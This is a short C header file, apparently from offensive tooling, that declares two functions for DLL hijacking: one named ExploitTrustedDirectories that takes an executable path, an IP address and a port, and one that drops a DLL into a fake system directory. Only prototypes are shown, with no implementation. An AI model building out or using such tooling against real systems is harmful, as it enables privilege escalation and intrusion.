#pragma once

#ifndef DLL_HIJACKING_HEADER_H
#define DLL_HIJACKING_HEADER_H

BOOL ExploitTrustedDirectories(Kernel32_API kernel32, Advapi32_API advapi32, char* PathExeToRun, WCHAR* UipAddress, char* port);
BOOL DropDllFile(char* fakeSystemDir, char* fileName);

#endif